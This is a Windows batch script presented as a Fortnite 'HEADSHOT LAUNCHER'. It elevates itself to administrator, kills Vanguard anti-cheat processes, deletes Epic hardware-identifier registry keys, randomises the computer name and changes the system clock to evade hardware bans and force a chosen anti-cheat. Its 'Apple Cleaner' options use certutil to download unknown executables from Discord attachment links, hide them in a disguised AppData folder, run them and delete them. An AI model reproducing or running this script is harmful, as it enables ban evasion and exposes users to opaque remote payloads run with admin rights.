@echo off
title HEADSHOT LAUNCHER // STARTING UP! (LOADING MAY TAKE UP TO 10 SECONDS)
MODE 19,1
:FULLSTARTUP
set "params=%*" >nul
cls
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B ) >nul
cls
taskkill /f /im vgtray.exe >nul
cls
taskkill /f /im vgc.exe >nul
cls
@shift /0
cd C:\Windows\System32
cls
net start w32time >nul
cls
W32tm /resync /force >nul
cls
title HEADSHOT LAUNCHER
goto FORTPATCHER

::⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣶⡮⣿⣶⣖⣤⣭⣝⣹⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
::⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢰⠟⣿⣿⣿⣷⣿⣿⠳⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
::⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⡇⠘⠠⠰⢹⣿⣿⢑⡑⢈⡳⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
::⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠝⠻⣿⡶⠂⢲⠂⠘⣟⣿⡕⠘⠀⢀⠂⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
::⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠀⠰⣿⣿⣿⣿⡿⣿⢿⣟⠗⠆⠑⠨⣾⠝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
::⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣷⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
::⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣿⣍⣿⣿⢿⠿⣿⣿⣿⣿⣿⣿⢿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
::⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⡉⠁⠁⠀⣎⣦⡘⠂⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
::⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⣷⣦⠄⠀⣶⣿⣿⣃⠤⠀⠀⢈⠥⠉⢻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
::⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣋⠀⢇⢠⣿⣿⣿⣷⣖⣿⣿⣿⠆⠀⠈⠳⠯⠁⠀⠀⠀⢳⣿⠁⠳⣍⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⢿
::⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢷⠚⢻⣿⣿⡟⠉⠉⢹⣿⣿⠿⠀⠀⠀⠀⢀⠀⠀⠀⠀⢸⢨⣶⣼⡜⠟⠤⣛⢉⠛⠿⢿⣿⣿⠃⠀⢀⣿ 
::⠿⣿⣿⣿⣿⣿⣿⣿⢿⢯⣴⡅⣀⣾⣿⣿⣄⣀⣴⣿⣯⣥⣦⣄⡀⠤⠄⠀⠙⠢⢄⠀⣜⣾⣿⣿⣿⣦⡀⡞⡭⠒⠇⠀⠙⠻⠁⠀⠈⣿
::⠀⠈⢻⣿⣿⡟⠁⠀⣠⠞⠑⠀⢼⣿⣿⣿⣿⣿⣟⠯⢾⣿⣛⣃⠚⡒⣒⣂⣀⠤⠸⢁⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⣿ 
::⠿⡂⢹⠿⠏⠀⠀⠎⠁⠀⠀⢰⣟⢿⣿⣿⣿⣿⣿⢟⣯⢛⠋⠉⠉⠀⠀⢠⠋⠀⡄⣾⣿⣿⣿⣿⣿⣽⣿⠇⠀⢀⠀⡀⠂⠀⠀⠀⠀⢸ 
::⡬⠰⣨⠔⡡⡂⠃⠁⠀⠐⠊⠁⠀⡀⣿⣿⣿⠟⣿⣯⣾⢑⠀⠀⠀⠀⠐⠁⠀⠀⣬⠌⠙⠛⢿⣿⣾⢿⣯⡀⠀⢀⠁⡈⠀⠀⠀⠀⠀⠘ 
::⢐⠤⠃⠬⡂⢁⠄⠀⠀⠀⠀⡶⢏⠝⠋⠉⠁⠀⣸⣿⣿⣷⣿⣷⡶⠶⠂⠀⠀⣶⣧⢈⠀⠀⠀⠀⠀⠐⠹⠿⣶⡆⠂⠀⠀⠀⠀⠀⠀⠀
::⢀⠀⠀⠈⠀⠐⠂⠁⠀⡀⠀⠀⠀⠐⠀⠀⠀⠀⢺⣿⣿⣾⣽⣥⣀⣀⡀⣠⣾⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠈⠹⠷⣤⡀⠀⡀⠀⠀⠀
::⡰⠀⠀⠀⠀⠑⠂⠈⠁⠀⠁⠀⠁⠀⠀⠀⠀⠀⠂⠛⠿⣿⣿⣿⣿⣷⣿⣿⡿⠟⠋⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⡂⠙⣦⡀⠊
::⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠃⠉⡀⠀
::⣵⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⣥⣅⣈
::⣿⡦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣟⠶⡈
::⠩⢚⡛⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⢷⢊⠀
::⢎⣔⣀⢀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣵⣒
::⢉⠫⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢄⠀⠀⠀⡀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢠⡰⠂⣟⣭⠀
::⡻⢕⠦⠄⢀⠠⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣅⡦⣷⡃⣿⣶⡆
:: Made by xoElf

:startup
cls
mode con: cols=80 lines=11 >nul
color 47
cls
echo.
echo  ==========================================================
echo   HEADSHOT LAUNCHER // By Elf#0779
echo    [1] - Launch Fortnite [with EAC]
echo    [2] - Launch Fortnite [with BE]
echo    [3] - Check HWID
echo    [4] - Apple Cleaners
echo  ==========================================================
echo.
set /p text=Select a number: 
if /i "%text%"=="1" goto EACForcer
if /i "%text%"=="2" goto BEForcer
if /i "%text%"=="3" goto check
if /i "%text%"=="4" goto Cleaner
echo INVALID SELECTION.
goto startup






:check
cls
mode con: cols=80 lines=20 >nul
cls
cd C:\Windows\System32\wbem
echo.
echo ==================================
wmic diskdrive get serialnumber /value
echo PRESS ANY KEY TO RETURN!
echo ==================================
echo.
pause>nul
goto startup













::EVERYTHING BELOW IS FOR THE EAC FORCER
:EACForcer
cls
echo.
echo  ==================================
echo   Press any key to force EAC...
echo  ==================================
echo.
pause>nul
:EAC
set /a try=1
cls
echo.
echo  FORCING EAC! (ATTEMPT #: %try%)
set /a try+=1
tasklist /nh /fi "imagename eq EpicGamesLauncher.exe" | find /i "EpicGamesLauncher.exe" 1>nul 2>nul && (
  taskkill /f /im EpicGamesLauncher.exe 1>nul 2>nul
)
reg delete "HKEY_CURRENT_USER\Software\Epic Games\Unreal Engine\Hardware Survey" /f 1>nul 2>nul
reg delete "HKEY_CURRENT_USER\Software\Epic Games\Unreal Engine\Identifiers" /f 1>nul 2>nul
reg delete "HKU\S-1-5-21-860440266-1445122309-108474356-1001\Software\Epic Games\Unreal Engine\Identifiers" /va /f 1>nul 2>nul
reg delete "HKU\S-1-5-21-860440266-1445122309-108474356-1001\Software\Epic Games\Unreal Engine\Hardware Survey" /va /f 1>nul 2>nul
reg delete "HKEY_CURRENT_USER\Software\Epic Games" /f 1>nul 2>nul
reg delete "HKU\S-1-5-21-860440266-1445122309-108474356-1001\Software\Epic Games" /f 1>nul 2>nul
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName /v ComputerName /t REG_SZ /d FORCEr%random% /f 1>nul 2>nul
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName /v ComputerName /t REG_SZ /d FORCEr%random% /f 1>nul 2>nul
reg delete "HKEY_CURRENT_USER\Software\Epic Games" /f 1>nul 2>nul
timeout /T 5 /nobreak 1>nul 2>nul
start com.epicgames.launcher://apps/Fortnite?action=launch

:check1
tasklist /nh /fi "imagename eq EasyAntiCheat.exe" | find /i "EasyAntiCheat.exe" 1>nul 2>nul && (
goto done
) || (
  goto check2
)
:check2
tasklist /nh /fi "imagename eq BEService.exe" | find /i "BEService.exe" 1>nul 2>nul && (
timeout /T 2 /nobreak 1>nul 2>nul
taskkill /f /im FortniteClient-Win64-Shipping_BE.exe 1>nul 2>nul
sc stop BEService 1>nul 2>nul
taskkill /f /im EpicGamesLauncher.exe 1>nul 2>nul
) || (
  goto check1
)
powershell -Command "Set-Date -Date (Get-Date).AddDays(1) | Out-Null"
timeout /T 3 /nobreak 1>nul 2>nul
cls
goto EAC

:done
cls
cd C:\Windows\System32
cls
net start w32time >nul
cls
W32tm /resync /force >nul
cls
echo.
echo  EAC is now forced!
echo.
pause >nul

goto FULLSTARTUP























::THIS IS ALL BE FORCER SHIT
:BEFORCER
@shift /0
@ECHO OFF
set try=1
cls

echo.
echo  ==================================
echo   Press any key to force BE...
echo  ==================================
echo.
pause>nul
:BE
cls
echo.
echo FORCING BattlEye! (ATTEMPT #: %try%)
set /a try+=1
tasklist /nh /fi "imagename eq EpicGamesLauncher.exe" | find /i "EpicGamesLauncher.exe" 1>nul 2>nul && (
  taskkill /f /im EpicGamesLauncher.exe 1>nul 2>nul
)
reg delete "HKEY_CURRENT_USER\Software\Epic Games\Unreal Engine\Hardware Survey" /f 1>nul 2>nul
reg delete "HKEY_CURRENT_USER\Software\Epic Games\Unreal Engine\Identifiers" /f 1>nul 2>nul
reg delete "HKU\S-1-5-21-860440266-1445122309-108474356-1001\Software\Epic Games\Unreal Engine\Identifiers" /va /f 1>nul 2>nul
reg delete "HKU\S-1-5-21-860440266-1445122309-108474356-1001\Software\Epic Games\Unreal Engine\Hardware Survey" /va /f 1>nul 2>nul
reg delete "HKEY_CURRENT_USER\Software\Epic Games" /f 1>nul 2>nul
reg delete "HKU\S-1-5-21-860440266-1445122309-108474356-1001\Software\Epic Games" /f 1>nul 2>nul
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName /v ComputerName /t REG_SZ /d FORCEr%random% /f 1>nul 2>nul
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName /v ComputerName /t REG_SZ /d FORCEr%random% /f 1>nul 2>nul
reg delete "HKEY_CURRENT_USER\Software\Epic Games" /f 1>nul 2>nul
timeout /T 5 /nobreak 1>nul 2>nul
start com.epicgames.launcher://apps/Fortnite?action=launch

:BEcheck1
tasklist /nh /fi "imagename eq BEService.exe" | find /i "BEService.exe" 1>nul 2>nul && (
goto done
) || (
  goto BEcheck2
)

:BEcheck2
tasklist /nh /fi "imagename eq EasyAntiCheat.exe" | find /i "EasyAntiCheat.exe" 1>nul 2>nul && (
timeout /T 2 /nobreak 1>nul 2>nul
taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe 1>nul 2>nul
taskkill /f /im EpicGamesLauncher.exe 1>nul 2>nul
) || (
  goto check1
)
powershell -Command "Set-Date -Date (Get-Date).AddDays(1) | Out-Null"
timeout /T 3 /nobreak 1>nul 2>nul
cls
goto BE


:done
cls
cd C:\Windows\System32
cls
net start w32time >nul
cls
W32tm /resync /force >nul
cls
echo.
echo  BE is now forced!
echo.
pause >nul

goto FULLSTARTUP


















::ALL THIS IS FORTPATCHER SHIT
:FORTPATCHER
:FilesToSearchFor
set path1="C:\Program Files\Epic Games\Fortnite\FortniteGame\Binaries\Win64\EasyAntiCheat\Launcher"
set path2="E:\Fortnite\FortniteGame\Binaries\Win64\EasyAntiCheat\Launcher"
set path3="C:\Fortnite\FortniteGame\Binaries\Win64\EasyAntiCheat\Launcher"
set path4="D:\Fortnite\FortniteGame\Binaries\Win64\EasyAntiCheat\Launcher"
set path5="F:\Fortnite\FortniteGame\Binaries\Win64\EasyAntiCheat\Launcher"
set path6="D:\Program Files\Epic Games\Fortnite\FortniteGame\Binaries\Win64\EasyAntiCheat\Launcher"
set path7="D:\Program Files\Epic Games\Fortnite\FortniteGame\Binaries\Win64\EasyAntiCheat\Launcher"

:searchd
if exist %path1% set path=%path1%
if exist %path2% set path=%path2%
if exist %path3% set path=%path3%
if exist %path4% set path=%path4%
if exist %path5% set path=%path5%
if exist %path6% set path=%path6%
if exist %path7% set path=%path7%
goto eac

:eac
md %path% >nul
cls
cd %path%
del /f SplashScreen.png
cd C:\Windows\System32
cls
set EACurl=https://cdn.discordapp.com/attachments/844364245050851329/845047496761016330/SplashScreen.png >nul
set EACfile=SplashScreen.png >nul
certutil -urlcache -split -f %EACurl% %EACfile% >nul
move %EACfile% %path%\%EACfile% >nul
cls

:FilesToSearchFor2
set path1="C:\Program Files\Epic Games\Fortnite\FortniteGame\Content\Splash"
set path2="E:\Fortnite\FortniteGame\Content\Splash"
set path3="C:\Fortnite\FortniteGame\Content\Splash"
set path4="D:\Fortnite\FortniteGame\Content\Splash"
set path5="F:\Fortnite\FortniteGame\Content\Splash"
set path6="D:\Program Files\Epic Games\Content\Fortnite\FortniteGame\Splash"
set path7="E:\Program Files\Epic Games\Content\Fortnite\FortniteGame\Splash"

:searcha
if exist %path1% set path=%path1%
if exist %path2% set path=%path2%
if exist %path3% set path=%path3%
if exist %path4% set path=%path4%
if exist %path5% set path=%path5%
if exist %path6% set path=%path6%
if exist %path7% set path=%path7%
goto splash

:splash
md %path% >nul
cls
cd %path%
del /f Splash.bmp
cd C:\Windows\System32
cls
set SPLASHurl=https://cdn.discordapp.com/attachments/840030032444391425/845163291864203264/Splash.bmp >nul
set SPLASHfile=Splash.bmp >nul
certutil -urlcache -split -f %SPLASHurl% %SPLASHfile% >nul
move %SPLASHfile% %path%\%SPLASHfile% >nul
cls

:FilesToSearchFor3
set path1="%systemdrive%\Users\%username%\AppData\Local\FortniteGame\Saved\Config\WindowsClient"
if exist %path1% set path=%path1%

:GameUserSettings
md %path% >nul
cls
cd %path%
del /f GameUserSettings.ini
cd C:\Windows\System32
set SETTINGSurl=https://cdn.discordapp.com/attachments/811055626444079135/824670477721010246/GameUserSettings.ini >nul
set SETTINGSfile=GameUserSettings.ini >nul
certutil -urlcache -split -f %SETTINGSurl% %SETTINGSfile% >nul
move %SETTINGSfile% %path%\%SETTINGSfile% >nul
cls
goto Startup














:CLEANER
mode con: cols=80 lines=11 >nul
:CLEANERLOADER
cd C:\Windows\System32
cls
title Apple Cleaner Loader
echo.
echo  ==========================================================
echo  Apple Cleaner Loader // Made by xoElf
echo  [1] - Apple S4 (Use First)
echo  [2] - Apple S6 (Use Second)
echo  [3] - Home
echo  ==========================================================
echo.
set /p text=Select a number: 
if /i "%text%"=="1" goto s4
if /i "%text%"=="2" goto s6
if /i "%text%"=="3" goto STARTUP

:s4
md %appdata%\Mojang\seagull\turtle\apple >nul
cls
set url=https://cdn.discordapp.com/attachments/840030032444391425/848684626557665280/s4.exe >nul
set file=s4.exe >nul
certutil -urlcache -split -f %url% %file% >nul
set path=%appdata%\Mojang\Seagull\Turtle\Apple >nul
move %file% %path%\%file% >nul
cd %path% >nul
start %file% >nul
del %file% >nul
timeout /f
goto startup

:s6
md %appdata%\Mojang\seagull\turtle\apple >nul
cls
set url=https://cdn.discordapp.com/attachments/840030032444391425/848684630759702551/s6.exe >nul
set file=s6.exe >nul
certutil -urlcache -split -f %url% %file% >nul
set path=%appdata%\Mojang\Seagull\Turtle\Apple >nul
move %file% %path%\%file% >nul
cd %path% >nul
start %file% >nul
del %file% >nul
goto startup
